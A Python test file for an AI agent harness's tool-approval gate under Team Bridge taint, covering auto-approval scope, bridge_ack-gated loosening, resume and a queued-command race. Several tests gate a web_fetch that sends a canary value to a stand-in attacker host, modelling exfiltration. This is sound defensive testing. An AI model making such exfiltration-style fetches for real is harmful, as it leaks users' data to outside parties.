"""The runtime gate under Team Bridge taint (team-bridge-egress.md: "Cards", "Grants",
"bridge_ack").

Rows: T22b (a parked card is not answered by a mode change), T22d (a SESSION
auto keeps covering calls once the session latches, also after resume --
#3928), T22e (a post-latch ``/approvals auto`` needs ``bridge_ack`` over the
routed seam and survives resume), T22f (GLOBAL auto covers a latched session,
the same rule as T22d), the #3928 two-session repro and its ``ask`` negative
controls, and the card's projection (``bridge_latched``/``taint_raised`` and
the notice in the detail).
"""

from __future__ import annotations

import asyncio
import json
from pathlib import Path
from typing import Any

import pytest

from local_operator.config_watch import _reset_for_tests
from local_operator.harness.approval import ACCOUNT_PROFILE_GATE
from local_operator.harness.bridge_egress import bridge_card_notice
from local_operator.session.approval_policy import OVERRIDE_FILENAME
from local_operator.session.frontend_state import SlashResult
from tests.unit.session.runtime.test_serving_approvals_live import _handle


@pytest.fixture(autouse=True)
def _fresh_registry():
    _reset_for_tests()
    yield
    _reset_for_tests()


async def _parks(handle, *, taint_raised: bool = False) -> bool:
    """Whether a new call parks a card (True) or is answered inline (False)."""
    call = asyncio.ensure_future(
        handle._approval_gate(
            "web_fetch",
            "https://atk.test/?d=LOPCANARY",
            taint_raised=taint_raised,
            bridge_latched=True,
        )
    )
    await asyncio.sleep(0)
    if call.done():
        assert call.result() is True
        return False
    pending = handle._fold.projection.pending
    assert pending is not None
    await handle.approval_answer(pending.request_id, False, False)
    assert await call is False
    return True


@pytest.mark.asyncio
async def test_t22f_global_auto_answers_a_latched_session_inline(tmp_path: Path) -> None:
    handle, session, _watcher, _emitted = _handle(tmp_path, auto_approve=True)
    setattr(session, "bridge_latched", True)
    # No conversation record: the gate follows the machine default.
    assert await _parks(handle) is False
    await handle.dispose()


@pytest.mark.asyncio
async def test_t22d_pre_latch_session_auto_keeps_covering_after_the_latch_and_resume(
    tmp_path: Path,
) -> None:
    """#3928: a conversation's own ``auto`` is honoured under the latch like global auto."""
    session_dir = tmp_path / "session"
    session_dir.mkdir()
    handle, session, _watcher, _emitted = _handle(
        tmp_path, auto_approve=False, session_dir=session_dir
    )
    setattr(session, "bridge_latched", False)
    handle._approvals_slash(session, "auto", SlashResult)  # typed BEFORE any bridge content
    assert handle._auto_approve is True
    record = json.loads((session_dir / OVERRIDE_FILENAME).read_text())
    assert record == {"schema_version": 1, "override": "auto"}

    setattr(session, "bridge_latched", True)  # a bridge card arrives
    assert await _parks(handle, taint_raised=True) is False
    # /approvals and the pending-gate state agree with the gate: auto. A card
    # that still parks (an account profile save is never auto-approved)
    # publishes the live mode, no longer an ``ask``/``suspended`` fold.
    assert handle._approvals_slash(session, "", SlashResult).text.startswith("tool approvals: auto")
    profile = asyncio.ensure_future(handle._approval_gate(ACCOUNT_PROFILE_GATE, "save"))
    await asyncio.sleep(0)
    gate = _published_gate(handle)
    assert gate.get("approval_mode") == "auto"
    assert "approval_suspended" not in gate
    pending = handle._fold.projection.pending
    assert pending is not None
    await handle.approval_answer(pending.request_id, False, False)
    assert await profile is False
    await handle.dispose()

    resumed, resumed_session, _w, _e = _handle(
        tmp_path, auto_approve=False, session_dir=session_dir
    )
    setattr(resumed_session, "bridge_latched", True)
    resumed._adopt_persisted_approval_override()
    assert resumed._auto_approve is True
    assert await _parks(resumed) is False
    await resumed.dispose()


@pytest.mark.asyncio
async def test_t22e_post_latch_auto_needs_bridge_ack_then_survives_resume(
    tmp_path: Path,
) -> None:
    session_dir = tmp_path / "session"
    session_dir.mkdir()
    handle, session, _watcher, _emitted = _handle(
        tmp_path, auto_approve=False, session_dir=session_dir
    )
    setattr(session, "bridge_latched", True)

    # An old desktop's "Set auto" (no marker) is refused; the gate still asks.
    refused = handle._approvals_slash(session, "auto", SlashResult)
    assert (
        refused.data.get("ok") is False and refused.data.get("approval_reason") == "bridge_latched"
    )
    assert "Agent messages" in refused.text and "in the terminal" in refused.text
    assert handle._auto_approve is False
    assert not (session_dir / OVERRIDE_FILENAME).exists()
    assert await _parks(handle) is True

    # The picker / typed command (marked) is the deliberate loosening. The
    # record is just the mode: no latch stamp is needed for it to keep
    # covering calls (#3928).
    handle._approvals_slash(session, "auto", SlashResult, bridge_ack=True)
    assert handle._auto_approve is True
    record = json.loads((session_dir / OVERRIDE_FILENAME).read_text())
    assert record == {"schema_version": 1, "override": "auto"}
    assert await _parks(handle) is False
    await handle.dispose()

    resumed, resumed_session, _w, _e = _handle(
        tmp_path, auto_approve=False, session_dir=session_dir
    )
    setattr(resumed_session, "bridge_latched", True)
    resumed._adopt_persisted_approval_override()
    assert await _parks(resumed) is False
    await resumed.dispose()


def _published_gate(handle: Any) -> dict[str, Any]:
    """The pending-gate payload ``_publish_pending_gate`` would push, captured."""
    captured: dict[str, Any] = {}

    class _Store:
        def mutate(self, **fields: Any) -> None:
            captured.update(fields)

    handle._session._frontend_state_store = _Store()
    handle._publish_pending_gate()
    return captured.get("pending_gate") or {}


async def _latched_session(tmp_path: Path, name: str, record: str | None, default_auto: bool):
    """One conversation over its own config dir and session dir, then latched."""
    root = tmp_path / name
    root.mkdir()
    session_dir = root / "session"
    session_dir.mkdir()
    if record is not None:
        (session_dir / OVERRIDE_FILENAME).write_text(
            json.dumps({"schema_version": 1, "override": record})
        )
    handle, session, _watcher, emitted = _handle(
        root, auto_approve=default_auto, session_dir=session_dir
    )
    handle._adopt_persisted_approval_override()
    setattr(session, "bridge_latched", True)
    return handle, session, emitted


@pytest.mark.asyncio
async def test_3928_session_auto_and_machine_default_auto_get_the_same_outcome(
    tmp_path: Path,
) -> None:
    """The issue's exact repro: same machine default auto, same latch, two sessions.

    A has ``approvals.json`` override ``auto``; B rides the machine default.
    Before #3928 A parked an Allow/Deny card on every tool call (and
    published ``approval_mode: ask``) while B kept acting.
    """
    a, a_session, _ = await _latched_session(tmp_path, "a", "auto", True)
    b, b_session, _ = await _latched_session(tmp_path, "b", None, True)
    assert a._approval_grant().scope == "session" and b._approval_grant().scope == "global"
    assert await _parks(a, taint_raised=True) is False
    assert await _parks(b, taint_raised=True) is False
    for handle, session in ((a, a_session), (b, b_session)):
        report = handle._approvals_slash(session, "", SlashResult)
        assert report.text.startswith("tool approvals: auto")
        await handle.dispose()


@pytest.mark.asyncio
@pytest.mark.parametrize(
    ("record", "default_auto"),
    [
        (None, False),  # a latched session in ask mode
        ("ask", True),  # an ask session override under an auto machine default
    ],
)
async def test_3928_negative_control_latched_ask_still_prompts(
    tmp_path: Path, record: str | None, default_auto: bool
) -> None:
    handle, session, _ = await _latched_session(tmp_path, "c", record, default_auto)
    assert await _parks(handle) is True
    report = handle._approvals_slash(session, "", SlashResult)
    assert report.text.startswith("tool approvals: ask")
    await handle.dispose()


@pytest.mark.asyncio
@pytest.mark.parametrize(
    ("record", "default_auto", "word"),
    [
        ("auto", True, "auto"),  # its own session auto
        (None, True, "auto"),  # riding the machine default
        (None, True, "yolo"),  # same rule for every loosening spelling
    ],
)
async def test_4080_d2_unacked_auto_on_an_already_auto_latched_session_is_truthful(
    tmp_path: Path, record: str | None, default_auto: bool, word: str
) -> None:
    """Design r1 D2 on #4080: an unacked ``auto`` to a session ALREADY auto used
    to answer "auto is still off" while every tool ran unasked. It now answers
    with the bare report (auto in effect) and writes nothing."""
    handle, session, _ = await _latched_session(tmp_path, "d", record, default_auto)
    scope_before = handle._approval_grant().scope
    directory = handle._session_directory()
    assert directory is not None
    override_path = directory / OVERRIDE_FILENAME
    override_before = override_path.read_bytes() if override_path.exists() else None

    receipt = handle._approvals_slash(session, word, SlashResult)

    assert receipt.data.get("ok") is True and receipt.data.get("approval_mode") == "auto"
    assert receipt.data.get("approval_reason") != "bridge_latched"
    assert receipt.text == handle._approvals_slash(session, "", SlashResult).text
    assert receipt.text.startswith("tool approvals: auto")
    assert "still off" not in receipt.text
    # Nothing changed: no override pinned onto a machine-default session.
    assert handle._auto_approve is True
    assert handle._approval_grant().scope == scope_before
    after = override_path.read_bytes() if override_path.exists() else None
    assert after == override_before
    await handle.dispose()


@pytest.mark.asyncio
async def test_4080_d2_unacked_ask_to_auto_on_a_latched_session_is_still_refused(
    tmp_path: Path,
) -> None:
    """The D2 negative control: the receipt change is only for ALREADY auto."""
    handle, session, _ = await _latched_session(tmp_path, "e", None, False)
    refused = handle._approvals_slash(session, "auto", SlashResult)
    assert refused.data == {
        "approval_mode": "ask",
        "ok": False,
        "approval_reason": "bridge_latched",
    }
    assert handle._auto_approve is False
    assert await _parks(handle) is True
    await handle.dispose()


@pytest.mark.asyncio
async def test_t22b_a_parked_latched_card_is_not_answered_by_a_loosening(tmp_path: Path) -> None:
    handle, session, _watcher, _emitted = _handle(tmp_path, auto_approve=False)
    setattr(session, "bridge_latched", True)
    parked = asyncio.ensure_future(
        handle._approval_gate(
            "web_fetch", "https://atk.test/x", taint_raised=True, bridge_latched=True
        )
    )
    await asyncio.sleep(0)
    pending = handle._fold.projection.pending
    assert pending is not None
    # The card carries the typed flags and the notice line for every surface.
    assert pending.bridge_latched is True and pending.taint_raised is True
    assert pending.detail.startswith(bridge_card_notice())
    handle._approvals_slash(session, "auto", SlashResult, bridge_ack=True)
    await asyncio.sleep(0)
    assert not parked.done(), "a mode change answered a parked card"
    await handle.approval_answer(pending.request_id, False, False)
    assert await parked is False
    await handle.dispose()


@pytest.mark.asyncio
async def test_t22e_a_queued_approvals_auto_reads_the_latch_when_it_applies(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """PR #3697 x #3796: a slash that WAITED cannot loosen a session that latched meanwhile.

    #3697 lets a settings frame carry ``defer_ok``/``request_id`` and acks the
    switch lane's slashes (``/model``, ``/effort``, ``/fast``) ``queued`` before
    their body runs. ``/approvals`` is not on that lane, so ``defer_ok`` on it
    earns no early ack -- but it still waits on the connection's chain, which
    joins every queued switch. The race this pins: ``approvals auto`` (no
    ``bridge_ack``) is SENT while the session is clean, sits behind a held
    switch, the session latches, then the switch releases. The latch check must
    run when the command applies (``_approvals_slash``), not when it arrived.

    Real ``RuntimeServer`` over a real ``ServingSessionHandle`` and the owning
    console's real capability handshake (so the frame passes the authority
    seam and reaches the Team Bridge rule); only the held switch body is a
    stand-in, for the busy owner #3697's own tests model.
    """
    import threading

    from local_operator.harness.approval import mint_operator_cap
    from tests.unit.session.runtime.test_approval_authority_seam import _dial, _serve

    monkeypatch.setenv("LOCAL_OPERATOR_CONFIG_DIR", str(tmp_path))
    cap = mint_operator_cap()
    live = await _serve(tmp_path, operator_cap=cap)
    handle = live.handle
    setattr(handle._session, "bridge_latched", False)
    release = threading.Event()
    entered = asyncio.Event()

    async def held_set_model(provider, model_id, *, request_id=None):  # noqa: ANN001, ANN202
        # Accepting ``request_id`` is what makes the server defer this switch
        # (``_switch_reports_outcome``), exactly as for a real outcome publisher.
        entered.set()
        assert await asyncio.to_thread(release.wait, 10), "the test never released"
        return {"ok": True}

    handle.set_model = held_set_model  # type: ignore[method-assign]
    conn = None

    async def replies(req: int, window: float) -> list[dict[str, Any]]:
        assert conn is not None
        seen: list[dict[str, Any]] = []
        loop = asyncio.get_running_loop()
        deadline = loop.time() + window
        while (remaining := deadline - loop.time()) > 0:
            try:
                raw = await asyncio.wait_for(conn.reader.readline(), timeout=remaining)
            except asyncio.TimeoutError:
                break
            if not raw.strip():
                continue
            frame = json.loads(raw)
            if frame.get("req") == req and frame.get("op") in ("ack", "result", "error"):
                seen.append(frame)
                break
        return seen

    async def send(frame: dict[str, Any]) -> None:
        assert conn is not None
        conn.writer.write(json.dumps(frame).encode() + b"\n")
        await conn.writer.drain()

    try:
        conn = await _dial(live.record, client="daemon", cap=cap)
        await send(
            {
                "op": "set_model",
                "req": 1,
                "provider": "test",
                "model_id": "A",
                "defer_ok": True,
                "request_id": "rid-model",
            }
        )
        first = await replies(1, 5.0)
        assert first and first[0].get("queued") is True, first
        await asyncio.wait_for(entered.wait(), 5)
        await send(
            {
                "op": "slash_result",
                "req": 2,
                "command": "approvals",
                "args": "auto",
                "images": [],
                "defer_ok": True,
                "request_id": "rid-approvals",
                "operator_cap": conn.proof(cap),
            }
        )
        # Not on the switch lane: no early ``queued`` receipt, the frame waits.
        early = await replies(2, 0.5)
        assert early == [], f"approvals answered before it applied: {early}"

        setattr(handle._session, "bridge_latched", True)  # a bridge card lands meanwhile
        release.set()

        settled = await replies(2, 10.0)
        assert len(settled) == 1 and settled[0]["op"] == "result", settled
        payload = settled[0].get("data") or {}
        data = payload.get("data") or {}
        assert data.get("ok") is False, payload
        assert data.get("approval_reason") == "bridge_latched", payload
        assert "Agent messages" in str(payload.get("text")), payload
        assert handle._auto_approve is False, "a queued auto loosened a latched session"
    finally:
        release.set()
        if conn is not None:
            conn.close()
        await live.close(tmp_path)
